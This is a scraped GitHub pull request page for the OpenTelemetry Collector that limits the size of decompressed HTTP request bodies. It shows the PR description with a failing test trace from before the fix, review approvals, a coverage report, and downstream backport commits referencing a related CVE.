=== Content from github.com_32bfd211_20250111_025522.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector%2Fpull%2F10289)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector%2Fpull%2F10289)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=open-telemetry%2Fopentelemetry-collector)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-telemetry](/open-telemetry)
/
**[opentelemetry-collector](/open-telemetry/opentelemetry-collector)**
Public

* [Notifications](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector)
* [Star
   4.7k](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector)

* [Code](/open-telemetry/opentelemetry-collector)
* [Issues
  577](/open-telemetry/opentelemetry-collector/issues)
* [Pull requests
  62](/open-telemetry/opentelemetry-collector/pulls)
* [Discussions](/open-telemetry/opentelemetry-collector/discussions)
* [Actions](/open-telemetry/opentelemetry-collector/actions)
* [Projects
  1](/open-telemetry/opentelemetry-collector/projects)
* [Security](/open-telemetry/opentelemetry-collector/security)
* [Insights](/open-telemetry/opentelemetry-collector/pulse)

Additional navigation options

* [Code](/open-telemetry/opentelemetry-collector)
* [Issues](/open-telemetry/opentelemetry-collector/issues)
* [Pull requests](/open-telemetry/opentelemetry-collector/pulls)
* [Discussions](/open-telemetry/opentelemetry-collector/discussions)
* [Actions](/open-telemetry/opentelemetry-collector/actions)
* [Projects](/open-telemetry/opentelemetry-collector/projects)
* [Security](/open-telemetry/opentelemetry-collector/security)
* [Insights](/open-telemetry/opentelemetry-collector/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fopen-telemetry%2Fopentelemetry-collector%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# [confighttp] Apply MaxRequestBodySize to the result of a decompressed body #10289

 Merged

[mx-psi](/mx-psi)
merged 4 commits into
[open-telemetry:main](/open-telemetry/opentelemetry-collector/tree/main "open-telemetry/opentelemetry-collector:main")
from
[jpkrohling:jpkrohling/apply-size-restriction-to-decompressed](/jpkrohling/opentelemetry-collector/tree/jpkrohling/apply-size-restriction-to-decompressed "jpkrohling/opentelemetry-collector:jpkrohling/apply-size-restriction-to-decompressed")

Jun 3, 2024

 Merged

# [[confighttp] Apply MaxRequestBodySize to the result of a decompressed body](#top) #10289

[mx-psi](/mx-psi)
merged 4 commits into
[open-telemetry:main](/open-telemetry/opentelemetry-collector/tree/main "open-telemetry/opentelemetry-collector:main")
from
[jpkrohling:jpkrohling/apply-size-restriction-to-decompressed](/jpkrohling/opentelemetry-collector/tree/jpkrohling/apply-size-restriction-to-decompressed "jpkrohling/opentelemetry-collector:jpkrohling/apply-size-restriction-to-decompressed")

Jun 3, 2024

[Conversation
3](/open-telemetry/opentelemetry-collector/pull/10289)
[Commits
4](/open-telemetry/opentelemetry-collector/pull/10289/commits)
[Checks
49](/open-telemetry/opentelemetry-collector/pull/10289/checks)
[Files changed](/open-telemetry/opentelemetry-collector/pull/10289/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![jpkrohling](https://avatars.githubusercontent.com/u/13387?s=60&v=4)](/jpkrohling)

Copy link

Member

### @jpkrohling **[jpkrohling](/jpkrohling)** commented [Jun 3, 2024](#issue-2330989778)

This change applies a restriction on the size of the decompressed payload. Before this change, this is the result of the test added in this PR:

```
--- FAIL: TestServerWithDecompression (0.03s)
    /home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1327:
        	Error Trace:	/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1327
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/compression.go:163
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp.go:455
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/go/pkg/mod/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp@v0.52.0/handler.go:212
        	            				/home/jpkroehling/go/pkg/mod/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp@v0.52.0/handler.go:73
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/clientinfohandler.go:26
        	            				/usr/lib/golang/src/net/http/server.go:3137
        	            				/usr/lib/golang/src/net/http/server.go:2039
        	            				/usr/lib/golang/src/runtime/asm_amd64.s:1695
        	Error:      	An error is expected but got nil.
        	Test:       	TestServerWithDecompression
    /home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1328:
        	Error Trace:	/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1328
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/compression.go:163
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp.go:455
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/go/pkg/mod/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp@v0.52.0/handler.go:212
        	            				/home/jpkroehling/go/pkg/mod/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp@v0.52.0/handler.go:73
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/clientinfohandler.go:26
        	            				/usr/lib/golang/src/net/http/server.go:3137
        	            				/usr/lib/golang/src/net/http/server.go:2039
        	            				/usr/lib/golang/src/runtime/asm_amd64.s:1695
        	Error:
        	Test:       	TestServerWithDecompression
    /home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1357:
        	Error Trace:	/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1357
        	Error:      	Not equal:
        	            	expected: 200
        	            	actual  : 400
        	Test:       	TestServerWithDecompression
FAIL
FAIL	go.opentelemetry.io/collector/config/confighttp	0.036s
FAIL

```

Signed-off-by: Juraci Paixão Kröhling juraci@kroehling.de

Sorry, something went wrong.

All reactions

[![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&v=4)](/jpkrohling)

`[[confighttp] Apply MaxRequestBodySize to the result of a decompressed…](/open-telemetry/opentelemetry-collector/pull/10289/commits/6e5f4142b80659b02fb4b72e476ef0c6848787cf "[confighttp] Apply MaxRequestBodySize to the result of a decompressed body

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>")`
 …

`[6e5f414](/open-telemetry/opentelemetry-collector/pull/10289/commits/6e5f4142b80659b02fb4b72e476ef0c6848787cf)`

```
… body

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
```

 [![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&u=9ceb091c402688001623dcc1acd5833fc0d75e45&v=4)](/jpkrohling)
[jpkrohling](/jpkrohling)
requested review from
a team and
[mx-psi](/mx-psi)
[June 3, 2024 12:14](#event-13020050629)

[![MovieStoreGuy](https://avatars.githubusercontent.com/u/30928402?s=60&v=4)](/MovieStoreGuy)

**[MovieStoreGuy](/MovieStoreGuy)**
approved these changes
[Jun 3, 2024](#pullrequestreview-2093657835)

 [View reviewed changes](/open-telemetry/opentelemetry-collector/pull/10289/files/6e5f4142b80659b02fb4b72e476ef0c6848787cf)

[![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&v=4)](/jpkrohling)

`[set change as breaking, document the default value](/open-telemetry/opentelemetry-collector/pull/10289/commits/aa80c1cc35c46d7dac3fef542cba24d8ffcbbf82 "set change as breaking, document the default value

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>")`
 …

`[aa80c1c](/open-telemetry/opentelemetry-collector/pull/10289/commits/aa80c1cc35c46d7dac3fef542cba24d8ffcbbf82)`

```
Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
```

[![MovieStoreGuy](https://avatars.githubusercontent.com/u/30928402?s=60&v=4)](/MovieStoreGuy)

**[MovieStoreGuy](/MovieStoreGuy)**
reviewed
[Jun 3, 2024](#pullrequestreview-2093705321)

 [View reviewed changes](/open-telemetry/opentelemetry-collector/pull/10289/files/aa80c1cc35c46d7dac3fef542cba24d8ffcbbf82)

[config/confighttp/confighttp.go](/open-telemetry/opentelemetry-collector/pull/10289/files/aa80c1cc35c46d7dac3fef542cba24d8ffcbbf82#diff-1fadfcd3b4194004717150126d27e8a32fdaa8292ca99e81a937d26abe0998fa)
Outdated

Show resolved

Hide resolved

[![MovieStoreGuy](https://avatars.githubusercontent.com/u/30928402?s=60&v=4)](/MovieStoreGuy)

**[MovieStoreGuy](/MovieStoreGuy)**
approved these changes
[Jun 3, 2024](#pullrequestreview-2093710283)

 [View reviewed changes](/open-telemetry/opentelemetry-collector/pull/10289/files/aa80c1cc35c46d7dac3fef542cba24d8ffcbbf82)

 [jpkrohling](/jpkrohling)
added 2 commits
[June 3, 2024 14:41](#commits-pushed-e3fbf90)

[![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&v=4)](/jpkrohling)

`[do not set a nil body in test](/open-telemetry/opentelemetry-collector/pull/10289/commits/e3fbf90713bcdcd7584769acb2eda38aff1e3854 "do not set a nil body in test

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>")`
 …

`[e3fbf90](/open-telemetry/opentelemetry-collector/pull/10289/commits/e3fbf90713bcdcd7584769acb2eda38aff1e3854)`

```
Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
```

[![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&v=4)](/jpkrohling)

`[tests for default value](/open-telemetry/opentelemetry-collector/pull/10289/commits/974aa7634ba6d12a633fd925845cc8f97d60cc4c "tests for default value

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>")`
 …

`[974aa76](/open-telemetry/opentelemetry-collector/pull/10289/commits/974aa7634ba6d12a633fd925845cc8f97d60cc4c)`

```
Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
```

[![@codecov](https://avatars.githubusercontent.com/in/254?s=80&v=4)](/apps/codecov)
[![Codecov](https://avatars.githubusercontent.com/in/254?s=40&u=c392dd7c2afc51fe2347d4296afa8494ac05772e&v=4)](https://github.com/apps/codecov)

Copy link

### **[codecov](/apps/codecov) bot** commented [Jun 3, 2024](#issuecomment-2145135023)

| [Codecov](https://app.codecov.io/gh/open-telemetry/opentelemetry-collector/pull/10289?dropdown=coverage&src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=open-telemetry) Report All modified and coverable lines are covered by tests ✅  Project coverage is 92.65%. Comparing base [(`ed767dc`)](https://app.codecov.io/gh/open-telemetry/opentelemetry-collector/commit/ed767dc21968b2b2a2ba2ac95f40fe510de9de79?dropdown=coverage&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=open-telemetry) to head [(`974aa76`)](https://app.codecov.io/gh/open-telemetry/opentelemetry-collector/commit/974aa7634ba6d12a633fd925845cc8f97d60cc4c?dropdown=coverage&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=open-telemetry). Additional details and impacted files ``` @@            Coverage Diff             @@ ##             main   #10289      +/-   ## ========================================== + Coverage   92.61%   92.65%   +0.03%      ==========================================   Files         386      386                 Lines       18229    18232       +3      ========================================== + Hits        16882    16892      +10      + Misses       1002      996       -6      + Partials      345      344       -1      ```   [☔ View full report in Codecov by Sentry](https://app.codecov.io/gh/open-telemetry/opentelemetry-collector/pull/10289?dropdown=coverage&src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=open-telemetry). 📢 Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=open-telemetry). |
| --- |

All reactions

Sorry, something went wrong.

[![mx-psi](https://avatars.githubusercontent.com/u/5502710?s=60&v=4)](/mx-psi)

**[mx-psi](/mx-psi)**
approved these changes
[Jun 3, 2024](#pullrequestreview-2094156213)

 [View reviewed changes](/open-telemetry/opentelemetry-collector/pull/10289/files/974aa7634ba6d12a633fd925845cc8f97d60cc4c)

 Hide details
View details

[![@mx-psi](https://avatars.githubusercontent.com/u/5502710?s=40&u=f3e75d1eea47083cb122d48dee765a83b0eaf2aa&v=4)](/mx-psi)
[mx-psi](/mx-psi)
merged commit [`7dbaebb`](/open-telemetry/opentelemetry-collector/commit/7dbaebb48f33cf707a069c67eed5b2b614e9913b)
into
open-telemetry:main

[Jun 3, 2024](https://github.com/open-telemetry/opentelemetry-collector/pull/10289#event-13022912002)
49 checks passed

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
added this to the [next release](/open-telemetry/opentelemetry-collector/milestone/81) milestone
[Jun 3, 2024](#event-13022995530)

[Aneurysm9](/Aneurysm9)
added a commit
to aws-observability/aws-otel-collector
that referenced
this pull request
[Jun 5, 2024](#ref-commit-d5ff217)
[![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&u=50423d445f9227bbb3dff9780fe73e2e5d02ed65&v=4)](/Aneurysm9)

`[Backport changes to confighttp and configgrpc](/aws-observability/aws-otel-collector/commit/d5ff2179e05626814d02ae704a9a6da72115c7d7 "Backport changes to `confighttp` and `configgrpc`

Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
https://github.com/open-telemetry/opentelemetry-collector/pull/10289 and
https://github.com/open-telemetry/opentelemetry-collector/pull/10323 for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>")`
…

`[d5ff217](/aws-observability/aws-otel-collector/commit/d5ff2179e05626814d02ae704a9a6da72115c7d7)`

```
Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
[open-telemetry/opentelemetry-collector#10289](https://github.com/open-telemetry/opentelemetry-collector/pull/10289) and
[open-telemetry/opentelemetry-collector#10323](https://github.com/open-telemetry/opentelemetry-collector/pull/10323) for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>
```

[![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&u=50423d445f9227bbb3dff9780fe73e2e5d02ed65&v=4)](/Aneurysm9)
[Aneurysm9](/Aneurysm9)
mentioned this pull request
[Jun 5, 2024](#ref-pullrequest-2336610621)

[Backport changes to `confighttp` and `configgrpc`
aws-observability/aws-otel-collector#2742](/aws-observability/aws-otel-collector/pull/2742)
 Merged

[Aneurysm9](/Aneurysm9)
added a commit
to aws-observability/aws-otel-collector
that referenced
this pull request
[Jun 6, 2024](#ref-commit-8e5ff8f)
[![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&u=50423d445f9227bbb3dff9780fe73e2e5d02ed65&v=4)](/Aneurysm9)

`[Backport changes to confighttp and configgrpc](/aws-observability/aws-otel-collector/commit/8e5ff8f2b0847f8ca5ff91cb0da95d4f107a00c1 "Backport changes to `confighttp` and `configgrpc`

Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
https://github.com/open-telemetry/opentelemetry-collector/pull/10289 and
https://github.com/open-telemetry/opentelemetry-collector/pull/10323 for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>")`
…

`[8e5ff8f](/aws-observability/aws-otel-collector/commit/8e5ff8f2b0847f8ca5ff91cb0da95d4f107a00c1)`

```
Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
[open-telemetry/opentelemetry-collector#10289](https://github.com/open-telemetry/opentelemetry-collector/pull/10289) and
[open-telemetry/opentelemetry-collector#10323](https://github.com/open-telemetry/opentelemetry-collector/pull/10323) for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>
```

[![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&u=50423d445f9227bbb3dff9780fe73e2e5d02ed65&v=4)](/Aneurysm9)
[Aneurysm9](/Aneurysm9)
mentioned this pull request
[Jun 6, 2024](#ref-pullrequest-2337040187)

[Backport changes to `confighttp` and `configgrpc` to v0.39.x
aws-observability/aws-otel-collector#2743](/aws-observability/aws-otel-collector/pull/2743)
 Merged

[Aneurysm9](/Aneurysm9)
added a commit
to aws-observability/aws-otel-collector
that referenced
this pull request
[Jun 6, 2024](#ref-commit-b89839e)
[![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&u=50423d445f9227bbb3dff9780fe73e2e5d02ed65&v=4)](/Aneurysm9)

`[Backport changes to](/aws-observability/aws-otel-collector/commit/b89839e5bbcf4890972390e0f396ddf969236734 "Backport changes to `confighttp` and `configgrpc` (#2743)

Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
https://github.com/open-telemetry/opentelemetry-collector/pull/10289 and
https://github.com/open-telemetry/opentelemetry-collector/pull/10323 for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>") [confighttp](/aws-observability/aws-otel-collector/commit/b89839e5bbcf4890972390e0f396ddf969236734 "Backport changes to `confighttp` and `configgrpc` (#2743)

Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
https://github.com/open-telemetry/opentelemetry-collector/pull/10289 and
https://github.com/open-telemetry/opentelemetry-collector/pull/10323 for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>") [and](/aws-observability/aws-otel-collector/commit/b89839e5bbcf4890972390e0f396ddf969236734 "Backport changes to `confighttp` and `configgrpc` (#2743)

Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
https://github.com/open-telemetry/opentelemetry-collector/pull/10289 and
https://github.com/open-telemetry/opentelemetry-collector/pull/10323 for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>") [configgrpc](/aws-observability/aws-otel-collector/commit/b89839e5bbcf4890972390e0f396ddf969236734 "Backport changes to `confighttp` and `configgrpc` (#2743)

Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
https://github.com/open-telemetry/opentelemetry-collector/pull/10289 and
https://github.com/open-telemetry/opentelemetry-collector/pull/10323 for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>") [(](/aws-observability/aws-otel-collector/commit/b89839e5bbcf4890972390e0f396ddf969236734 "Backport changes to `confighttp` and `configgrpc` (#2743)

Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
https://github.com/open-telemetry/opentelemetry-collector/pull/10289 and
https://github.com/open-telemetry/opentelemetry-collector/pull/10323 for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>")[#2743](https://github.com/aws-observability/aws-otel-collector/pull/2743)[)](/aws-observability/aws-otel-collector/commit/b89839e5bbcf4890972390e0f396ddf969236734 "Backport changes to `confighttp` and `configgrpc` (#2743)

Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
https://github.com/open-telemetry/opentelemetry-collector/pull/10289 and
https://github.com/open-telemetry/opentelemetry-collector/pull/10323 for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>")`
…

`[b89839e](/aws-observability/aws-otel-collector/commit/b89839e5bbcf4890972390e0f396ddf969236734)`

```
Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
[open-telemetry/opentelemetry-collector#10289](https://github.com/open-telemetry/opentelemetry-collector/pull/10289) and
[open-telemetry/opentelemetry-collector#10323](https://github.com/open-telemetry/opentelemetry-collector/pull/10323) for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>
```

[![@tatianab](https://avatars.githubusercontent.com/u/6238967?s=40&v=4)](/tatianab)
[tatianab](/tatianab)
mentioned this pull request
[Jun 7, 2024](#ref-issue-2341176613)

[x/vulndb: potential Go vuln in github.com/open-telemetry/opentelemetry-collector: CVE-2024-36129
golang/vulndb#2900](/golang/vulndb/issues/2900)

Closed

[steves-canva](/steves-canva)
pushed a commit
to Canva/opentelemetry-collector
that referenced
this pull request
[Jun 14, 2024](#ref-commit-385b669)
[![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&u=9ceb091c402688001623dcc1acd5833fc0d75e45&v=4)](/jpkrohling) [![@steves-canva](https://avatars.githubusercontent.com/u/97483767?s=40&v=4)](/steves-canva)

`[[confighttp] Apply MaxRequestBodySize to the result of a decompressed…](/Canva/opentelemetry-collector/commit/385b669976c90aae4f337ca65e7c67a8ac2f6735 "[confighttp] Apply MaxRequestBodySize to the result of a decompressed body (#10289)

This change applies a restriction on the size of the decompressed
payload. Before this change, this is the result of the test added in
this PR:

```
--- FAIL: TestServerWithDecompression (0.03s)
    /home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1327:
        	Error Trace:	/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1327
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/compression.go:163
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp.go:455
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/go/pkg/mod/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp@v0.52.0/handler.go:212
        	            				/home/jpkroehling/go/pkg/mod/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp@v0.52.0/handler.go:73
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/clientinfohandler.go:26
        	            				/usr/lib/golang/src/net/http/server.go:3137
        	            				/usr/lib/golang/src/net/http/server.go:2039
        	            				/usr/lib/golang/src/runtime/asm_amd64.s:1695
        	Error:      	An error is expected but got nil.
        	Test:       	TestServerWithDecompression
    /home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1328:
        	Error Trace:	/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1328
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/compression.go:163
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp.go:455
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/go/pkg/mod/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp@v0.52.0/handler.go:212
        	            				/home/jpkroehling/go/pkg/mod/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp@v0.52.0/handler.go:73
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/clientinfohandler.go:26
        	            				/usr/lib/golang/src/net/http/server.go:3137
        	            				/usr/lib/golang/src/net/http/server.go:2039
        	            				/usr/lib/golang/src/runtime/asm_amd64.s:1695
        	Error:
        	Test:       	TestServerWithDecompression
    /home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1357:
        	Error Trace:	/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1357
        	Error:      	Not equal:
        	            	expected: 200
        	            	actual  : 400
        	Test:       	TestServerWithDecompression
FAIL
FAIL	go.opentelemetry.io/collector/config/confighttp	0.036s
FAIL
```

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>

---------

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>")`
…

`[385b669](/Canva/opentelemetry-collector/commit/385b669976c90aae4f337ca65e7c67a8ac2f6735)`

```
… body ([open-telemetry#10289](https://github.com/open-telemetry/opentelemetry-collector/pull/10289))

This change applies a restriction on the size of the decompressed
payload. Before this change, this is the result of the test added in
this PR:

```
--- FAIL: TestServerWithDecompression (0.03s)
    /home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1327:
        	Error Trace:	/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1327
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/compression.go:163
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp.go:455
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/go/pkg/mod/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp@v0.52.0/handler.go:212
        	            				/home/jpkroehling/go/pkg/mod/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp@v0.52.0/handler.go:73
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/clientinfohandler.go:26
        	            				/usr/lib/golang/src/net/http/server.go:3137
        	            				/usr/lib/golang/src/net/http/server.go:2039
        	            				/usr/lib/golang/src/runtime/asm_amd64.s:1695
        	Error:      	An error is expected but got nil.
        	Test:       	TestServerWithDecompression
    /home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1328:
